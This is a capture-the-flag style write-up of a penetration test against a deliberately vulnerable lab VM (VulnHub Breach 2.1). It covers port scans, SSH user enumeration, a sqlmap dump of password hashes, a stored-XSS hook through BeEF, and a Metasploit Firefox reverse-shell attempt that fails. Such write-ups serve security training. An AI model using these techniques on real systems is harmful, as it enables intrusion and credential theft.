# Ports Scan & Enumeration
## Ports Scan
- no mountd show by rpcbind
- seems only have weird ports 57646, don't know for what.
```bash
nmap -Pn -p111,57646,65535  -A 192.168.110.151                                                              1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 17:47 AEST
Nmap scan report for 192.168.110.151
Host is up (0.0042s latency).

PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39633/udp   status
|   100024  1          52715/tcp6  status
|   100024  1          57646/tcp   status
|_  100024  1          57646/udp6  status
57646/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
| ssh-hostkey:
|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
```

- Don't have anything from UDP scan as well
```bash
 sudo nmap -Pn -sU -v 192.168.110.151                                                                        1 ⨯
[sudo] password for htb:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 12:39 AEST
Initiating ARP Ping Scan at 12:39
Scanning 192.168.110.151 [1 port]
Completed ARP Ping Scan at 12:39, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:39
Completed Parallel DNS resolution of 1 host. at 12:39, 0.23s elapsed
Initiating UDP Scan at 12:39
Scanning 192.168.110.151 [1000 ports]
Increasing send delay for 192.168.110.151 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 192.168.110.151 from 50 to 100 due to max_successful_tryno increase to 5
...[snip]...
UDP Scan Timing: About 92.47% done; ETC: 12:57 (0:01:19 remaining)
Completed UDP Scan at 12:57, 1088.38s elapsed (1000 total ports)
Nmap scan report for 192.168.110.151
Host is up (0.0028s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE
111/udp  open|filtered rpcbind
5353/udp open|filtered zeroconf
MAC Address: 00:0C:29:0B:9B:4E (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1088.92 seconds
           Raw packets sent: 1419 (64.305KB) | Rcvd: 1089 (78.570KB)
```

## Enumeration
- OK, not much can try, port 57646 seems nothing so far. We can only try port 65535....
```bash
ssh -v 192.168.110.151 -p 65535                                                                           255 ⨯
OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 192.168.110.151 [192.168.110.151] port 65535.
debug1: Connection established.
debug1: identity file /home/htb/.ssh/id_rsa type 0
debug1: identity file /home/htb/.ssh/id_rsa-cert type -1
debug1: identity file /home/htb/.ssh/id_dsa type -1
debug1: identity file /home/htb/.ssh/id_dsa-cert type -1
debug1: identity file /home/htb/.ssh/id_ecdsa type -1
debug1: identity file /home/htb/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/htb/.ssh/id_ecdsa_sk type -1
debug1: identity file /home/htb/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /home/htb/.ssh/id_ed25519 type -1
debug1: identity file /home/htb/.ssh/id_ed25519-cert type -1
debug1: identity file /home/htb/.ssh/id_ed25519_sk type -1
debug1: identity file /home/htb/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /home/htb/.ssh/id_xmss type -1
debug1: identity file /home/htb/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.4p1 Debian-5
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.7p1 Debian-5+deb8u2
debug1: match: OpenSSH_6.7p1 Debian-5+deb8u2 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 192.168.110.151:65535 as 'htb'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU
debug1: checking without port identifier
The authenticity of host '[192.168.110.151]:65535 ([192.168.110.151]:65535)' can't be established.
ECDSA key fingerprint is SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.110.151]:65535' (ECDSA) to the list of known hosts.
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: /home/htb/.ssh/id_rsa RSA SHA256:NCq1OAlTc5S1hcTicRdWFnGTDw5B98v7DHcrOe62lfM
debug1: Will attempt key: /home/htb/.ssh/id_dsa
debug1: Will attempt key: /home/htb/.ssh/id_ecdsa
debug1: Will attempt key: /home/htb/.ssh/id_ecdsa_sk
debug1: Will attempt key: /home/htb/.ssh/id_ed25519
debug1: Will attempt key: /home/htb/.ssh/id_ed25519_sk
debug1: Will attempt key: /home/htb/.ssh/id_xmss
debug1: SSH2_MSG_SERVICE_ACCEPT received
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering public key: /home/htb/.ssh/id_rsa RSA SHA256:NCq1OAlTc5S1hcTicRdWFnGTDw5B98v7DHcrOe62lfM
debug1: Authentications that can continue: publickey,password
debug1: Trying private key: /home/htb/.ssh/id_dsa
debug1: Trying private key: /home/htb/.ssh/id_ecdsa
debug1: Trying private key: /home/htb/.ssh/id_ecdsa_sk
debug1: Trying private key: /home/htb/.ssh/id_ed25519
debug1: Trying private key: /home/htb/.ssh/id_ed25519_sk
debug1: Trying private key: /home/htb/.ssh/id_xmss
debug1: Next authentication method: password
htb@192.168.110.151's password:
```

- From above information we can see that sshd is configured as keys first, and then password auth.
- User name should be peter? What does `the password is in the source` mean?
- Unauthorized access is ENCOURAGED?
- Is there something in the blog? Is the blog in port 57646? But from web browser there's nothing
- Remote SSH version: OpenSSH_6.7p1
```bash
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC         										  	         #
#                 All connections are monitored and recorded        											           #
#                     Unauthorized access is encouraged                 													    #
#             Peter, if that's you - the password is in the source.     												     # 
#          Also, stop checking your blog all day and enjoy your vacation!  										#
#############################################################################
```

- Anyway OpenSSH_6.7p1 got username enum
```bash
OpenSSH < 7.7 - User Enumeration (2)                                              | linux/remote/45939.py

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ python3 45939.py -p 65535 192.168.110.151 aaa
[-] aaa is an invalid username

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ python3 45939.py -p 65535 192.168.110.151 root                                                              3 ⨯
[-] root is an invalid username

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ python3 45939.py -p 65535 192.168.110.151 peter                                                             3 ⨯
[+] peter is a valid username
```

- I run autorecon on the box as well, but got nothing new, and it tip me to do brute force on ssh, hmmmm, not sure it will work, but since we have no clue here, why not.
- And I scan the ports again, still the same. But got hint from one of the writeups, says password could be some variant of "in the source", and the sanest way of the variant is to take out all the space......."inthesource"
- Now we have very different behavior of ssh connection 
```bash
┌──(htb㉿kali)-[~]
└─$ ssh peter@192.168.110.151 -p 65535                                                                        130 ⨯
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
peter@192.168.110.151's password: [peter]
Permission denied, please try again.
peter@192.168.110.151's password: [peter]
Permission denied, please try again.
peter@192.168.110.151's password: [peter]
peter@192.168.110.151: Permission denied (publickey,password).

┌──(htb㉿kali)-[~]
└─$ ssh peter@192.168.110.151 -p 65535
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
peter@192.168.110.151's password: [inthesource]
Connection to 192.168.110.151 closed.
```
- Now we can see if you put in inthesource, the connection dropped directly.
- rescan the ports, and this time we have port 80 opened......
```bash
┌──(htb㉿kali)-[~]
└─$ nmap -Pn -p- -v 192.168.110.151
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 18:40 AEST
Initiating Parallel DNS resolution of 1 host. at 18:40
Completed Parallel DNS resolution of 1 host. at 18:40, 0.23s elapsed
Initiating Connect Scan at 18:40
Scanning 192.168.110.151 [65535 ports]
Discovered open port 111/tcp on 192.168.110.151
Discovered open port 80/tcp on 192.168.110.151
Discovered open port 57646/tcp on 192.168.110.151
Discovered open port 65535/tcp on 192.168.110.151
Completed Connect Scan at 18:40, 8.73s elapsed (65535 total ports)
Nmap scan report for 192.168.110.151
Host is up (0.0027s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
57646/tcp open  unknown
65535/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
```
-WOW, this is very interesting. # Web Service
- [[05 - Ports Scan & Enumeration]] got port 80 opened

## nikto
- /images
```bash
┌──(htb㉿kali)-[~]
└─$ nikto -host 192.168.110.151
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.151
+ Target Hostname:    192.168.110.151
+ Target Port:        80
+ Start Time:         2021-04-26 18:45:34 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1d4, size: 5362407d05e5f, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-04-26 18:46:36 (GMT10) (62 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## gobuster
- /blog
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ gobuster dir -u http://192.168.110.151 -x txt,html,htm,php,jsp,asp,aspx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,htm,php,jsp,asp,aspx
[+] Timeout:                 10s
===============================================================
2021/04/27 15:18:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.110.151/images/]
/index.html           (Status: 200) [Size: 468]
/blog                 (Status: 301) [Size: 317] [--> http://192.168.110.151/blog/]
/server-status        (Status: 403) [Size: 303]

===============================================================
2021/04/27 15:48:10 Finished
===============================================================
```

## Browser Access
- /index.html
![[Pasted image 20210426185912.png]]
- /blog
![[Pasted image 20210427154924.png]]
- seems can register new account.
- by playing with it, there's a username should be admin
![[Pasted image 20210427155110.png]]
- Seems like we have SQLi?
![[Pasted image 20210427155249.png]]
- And YES! SQLi confirmed
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req --dbs --batch
...[snip]...
[15:57:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[15:57:50] [INFO] fetching database names
available databases [5]:
[*] blog
[*] information_schema
[*] mysql
[*] oscommerce
[*] performance_schema

[15:57:50] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 15:57:50 /2021-04-27/
```

- The login and register link is gone after I register one account, and the link Members finally got one record
![[Pasted image 20210427160005.png]]
- So maybe the only diving entry is from SQLi?
- The DB oscommerce told us there's another online store system running
![[Pasted image 20210427160407.png]]

# mysql injection
- from [[10 - Web Service]] we confirmed SQLi
## DB oscommerce
- username: admin
- password: 32admin
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D oscommerce --tables --batch
...[snip]...
[16:01:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:01:43] [INFO] fetching tables for database: 'oscommerce'
[16:01:43] [WARNING] reflective value(s) found and filtering out
Database: oscommerce
[57 tables]
+-------------------------------------------+
| osc_address_book                          |
| osc_administrators                        |
| osc_administrators_access                 |
| osc_administrators_log                    |
| osc_banners                               |
| osc_banners_history                       |
| osc_categories                            |
| osc_categories_description                |
| osc_configuration                         |
| osc_configuration_group                   |
| osc_counter                               |
| osc_countries                             |
| osc_credit_cards                          |
| osc_currencies                            |
| osc_customers                             |
| osc_geo_zones                             |
| osc_languages                             |
| osc_languages_definitions                 |
| osc_manufacturers                         |
| osc_manufacturers_info                    |
| osc_newsletters                           |
| osc_newsletters_log                       |
| osc_orders                                |
| osc_orders_products                       |
| osc_orders_products_download              |
| osc_orders_products_variants              |
| osc_orders_status                         |
| osc_orders_status_history                 |
| osc_orders_total                          |
| osc_orders_transactions_history           |
| osc_orders_transactions_status            |
| osc_product_attributes                    |
| osc_products                              |
| osc_products_description                  |
| osc_products_images                       |
| osc_products_images_groups                |
| osc_products_notifications                |
| osc_products_to_categories                |
| osc_products_variants                     |
| osc_products_variants_groups              |
| osc_products_variants_values              |
| osc_reviews                               |
| osc_sessions                              |
| osc_shipping_availability                 |
| osc_shopping_carts                        |
| osc_shopping_carts_custom_variants_values |
| osc_specials                              |
| osc_tax_class                             |
| osc_tax_rates                             |
| osc_templates                             |
| osc_templates_boxes                       |
| osc_templates_boxes_to_pages              |
| osc_weight_classes                        |
| osc_weight_classes_rules                  |
| osc_whos_online                           |
| osc_zones                                 |
| osc_zones_to_geo_zones                    |
+-------------------------------------------+

[16:01:43] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:01:43 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D oscommerce -T osc_administrators --columns --batch
...[snip]...
[16:04:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:04:42] [INFO] fetching columns for table 'osc_administrators' in database 'oscommerce'
[16:04:42] [WARNING] reflective value(s) found and filtering out
Database: oscommerce
Table: osc_administrators
[3 columns]
+---------------+--------------+
| Column        | Type         |
+---------------+--------------+
| id            | int(11)      |
| user_name     | varchar(255) |
| user_password | varchar(40)  |
+---------------+--------------+

[16:04:42] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:04:42 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D oscommerce -T osc_administrators -C user_name,user_password --dump
...[snip]...
[16:05:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:05:03] [INFO] fetching entries of column(s) 'user_name,user_password' for table 'osc_administrators' in database 'oscommerce'
[16:05:03] [WARNING] reflective value(s) found and filtering out
Database: oscommerce
Table: osc_administrators
[1 entry]
+-----------+-------------------------------------+
| user_name | user_password                       |
+-----------+-------------------------------------+
| admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |    md5   	32admin
+-----------+-------------------------------------+

[16:05:04] [INFO] table 'oscommerce.osc_administrators' dumped to CSV file '/home/htb/.local/share/sqlmap/output/192.168.110.151/dump/oscommerce/osc_administrators.csv'
[16:05:04] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:05:04 /2021-04-27/
```

## DB blog
- no useful information even username admin is not exist, so this blog is just a lead to SQLi.
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D blog --tables --batch
...[snip]...
[16:10:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:10:06] [INFO] fetching tables for database: 'blog'
[16:10:07] [WARNING] reflective value(s) found and filtering out
Database: blog
[10 tables]
+-----------------------+
| blogphp_blogs         |
| blogphp_cat           |
| blogphp_comments      |
| blogphp_files         |
| blogphp_links         |
| blogphp_pages         |
| blogphp_stats         |
| blogphp_subscriptions |
| blogphp_templates     |
| blogphp_users         |
+-----------------------+

[16:10:07] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:10:07 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D blog -T blogphp_users --columns --batch
...[snip]...
[16:11:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:11:07] [INFO] fetching columns for table 'blogphp_users' in database 'blog'
[16:11:07] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: blogphp_users
[17 columns]
+----------+------------------+
| Column   | Type             |
+----------+------------------+
| date     | text             |
| level    | text             |
| aim      | text             |
| avatar   | text             |
| bday     | text             |
| email    | text             |
| gtalk    | text             |
| icq      | text             |
| id       | int(11) unsigned |
| logged   | text             |
| mlist    | text             |
| msn      | text             |
| name     | text             |
| password | text             |
| url      | text             |
| username | text             |
| yahoo    | text             |
+----------+------------------+

[16:11:07] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:11:07 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D blog -T blogphp_users -C username,password --dump
...[snip]...
[16:12:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:12:13] [INFO] fetching entries of column(s) 'password,username' for table 'blogphp_users' in database 'blog'
[16:12:13] [WARNING] reflective value(s) found and filtering out
[16:12:13] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[16:12:17] [INFO] writing hashes to a temporary file '/tmp/sqlmaprq8ujdas15282/sqlmaphashes-aa8i4zv2.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[16:12:21] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[16:12:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[16:12:25] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[16:12:25] [INFO] starting 2 processes
[16:12:56] [INFO] cracked password 'chx' for user 'chx'
Database: blog
Table: blogphp_users
[1 entry]
+----------+----------------------------------------+
| username | password                               |
+----------+----------------------------------------+
| chx      | 10f09471a412152a70c1a8b128bbd0a3 (chx) |
+----------+----------------------------------------+

[16:13:23] [INFO] table 'blog.blogphp_users' dumped to CSV file '/home/htb/.local/share/sqlmap/output/192.168.110.151/dump/blog/blogphp_users.csv'
[16:13:23] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:13:23 /2021-04-27/
```

## DB mysql
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D mysql --tables --batch
...[snip]...
[16:15:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:15:09] [INFO] fetching tables for database: 'mysql'
[16:15:09] [WARNING] reflective value(s) found and filtering out
Database: mysql
[24 tables]
+---------------------------+
| user                      |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+

[16:15:09] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:15:09 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D mysql -T user --columns --batch
...[snip]...
[16:16:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:16:02] [INFO] fetching columns for table 'user' in database 'mysql'
[16:16:02] [WARNING] reflective value(s) found and filtering out
Database: mysql
Table: user
[42 columns]
+------------------------+-----------------------------------+
| Column                 | Type                              |
+------------------------+-----------------------------------+
| User                   | char(16)                          |
| Alter_priv             | enum('N','Y')                     |
| Alter_routine_priv     | enum('N','Y')                     |
| authentication_string  | text                              |
| Create_priv            | enum('N','Y')                     |
| Create_routine_priv    | enum('N','Y')                     |
| Create_tablespace_priv | enum('N','Y')                     |
| Create_tmp_table_priv  | enum('N','Y')                     |
| Create_user_priv       | enum('N','Y')                     |
| Create_view_priv       | enum('N','Y')                     |
| Delete_priv            | enum('N','Y')                     |
| Drop_priv              | enum('N','Y')                     |
| Event_priv             | enum('N','Y')                     |
| Execute_priv           | enum('N','Y')                     |
| File_priv              | enum('N','Y')                     |
| Grant_priv             | enum('N','Y')                     |
| Host                   | char(60)                          |
| Index_priv             | enum('N','Y')                     |
| Insert_priv            | enum('N','Y')                     |
| Lock_tables_priv       | enum('N','Y')                     |
| max_connections        | int(11) unsigned                  |
| max_questions          | int(11) unsigned                  |
| max_updates            | int(11) unsigned                  |
| max_user_connections   | int(11) unsigned                  |
| Password               | char(41)                          |
| plugin                 | char(64)                          |
| Process_priv           | enum('N','Y')                     |
| References_priv        | enum('N','Y')                     |
| Reload_priv            | enum('N','Y')                     |
| Repl_client_priv       | enum('N','Y')                     |
| Repl_slave_priv        | enum('N','Y')                     |
| Select_priv            | enum('N','Y')                     |
| Show_db_priv           | enum('N','Y')                     |
| Show_view_priv         | enum('N','Y')                     |
| Shutdown_priv          | enum('N','Y')                     |
| ssl_cipher             | blob                              |
| ssl_type               | enum('','ANY','X509','SPECIFIED') |
| Super_priv             | enum('N','Y')                     |
| Trigger_priv           | enum('N','Y')                     |
| Update_priv            | enum('N','Y')                     |
| x509_issuer            | blob                              |
| x509_subject           | blob                              |
+------------------------+-----------------------------------+

[16:16:02] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.110.151'

[*] ending @ 16:16:02 /2021-04-27/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
└─$ sqlmap -r req -D mysql -T user -C User,Password --dump
...[snip]...
Database: mysql
Table: user
[4 entries]
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | <blank>                                   |
| root             | <blank>                                   |
| root             | <blank>                                   |
| debian-sys-maint | *D0C78CEFE547A41E829542C969E697104594B2C0 |
+------------------+-------------------------------------------+
```

# XSS
## Beef-XSS
- OK, since SQLi actually not lead to anything, and if we go search the `blogphp`, we will see some XSS exploit.
- And then I recall that we did have a tool called Beef-XSS from kali, and even more, from web page index.html, we did have a big image says beef....It's now all connected.
![[Pasted image 20210429102700.png]]
- This is the time to learn how to use Beef-XSS
- Start Beef-XSS, it will show us the hook link along with the web-ui link:
	- hook link: http://127.0.0.1:3000/hook.js
	- Web UI link: http://127.0.0.1:3000/ui/panel
```bash
┌──(htb㉿kali)-[~]
└─$ sudo beef-xss                                                        3 ⨯
[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - beef-xss
     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2021-04-29 12:19:51 AEST; 5s ago
   Main PID: 41528 (ruby)
      Tasks: 10 (limit: 9457)
     Memory: 129.3M
        CPU: 5.319s
     CGroup: /system.slice/beef-xss.service
             ├─41528 ruby /usr/share/beef-xss/beef
             └─41539 nodejs /tmp/execjs20210429-41528-h0mba7js

Apr 29 12:19:51 kali systemd[1]: Started beef-xss.
Apr 29 12:19:54 kali beef[41528]: [12:19:54][*] Browser Exploitation Fra….0.0
Apr 29 12:19:54 kali beef[41528]: [12:19:54]    |   Twit: @beefproject
Apr 29 12:19:54 kali beef[41528]: [12:19:54]    |   Site: https://beefpr….com
Apr 29 12:19:54 kali beef[41528]: [12:19:54]    |   Blog: http://blog.be….com
Apr 29 12:19:54 kali beef[41528]: [12:19:54]    |_  Wiki: https://github…wiki
Apr 29 12:19:54 kali beef[41528]: [12:19:54][*] Project Creator: Wade Al…orn)
Apr 29 12:19:54 kali beef[41528]: -- migration_context()
Apr 29 12:19:54 kali beef[41528]:    -> 0.0078s
Apr 29 12:19:54 kali beef[41528]: [12:19:54][*] BeEF is loading. Wait a …s...
Hint: Some lines were ellipsized, use -l to show in full.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1...
```

- After login, we will see offline/online browser folder, but everything is empty, this is because we haven't put the hook into our target website.
- Since we do have blogphp register page, we can use it to put the hook.
![[Pasted image 20210429122955.png]]
- Then after we click members, this script would show and execute in this page
![[Pasted image 20210429123043.png]].
- Which will hook this blogphp to our beef-xss
![[Pasted image 20210429123254.png]]
- Then we create an invisible iFrame to execute our payload, it's actually a lot like RFI.
```bash
┌──(htb㉿kali)-[/etc/beef-xss]
└─$ msfvenom --list payloads | grep firefox
    firefox/exec                                        This module runs a shell command on the target OS without
    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to
    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to
```
- Actually for exploit: https://www.exploit-db.com/exploits/17640, we don't need Beef-XSS framework at all, the only trick is how we create our payload.
	- `<META http-equiv="refresh" content="0;URL=http://www.google.com">`

- Tried msfconsole, but seems the ua_ver error, which means the victim web browser version is not correct for this exploit, it not work:
```bash
msf6 > use exploit/multi/browser/firefox_proto_crmfrequest
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set PAYLOAD firefox/shell_reverse_tcp
PAYLOAD => firefox/shell_reverse_tcp
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set LHOST 192.168.110.100
LHOST => 192.168.110.100
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set SRVHOST 192.168.110.100
SRVHOST => 192.168.110.100
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

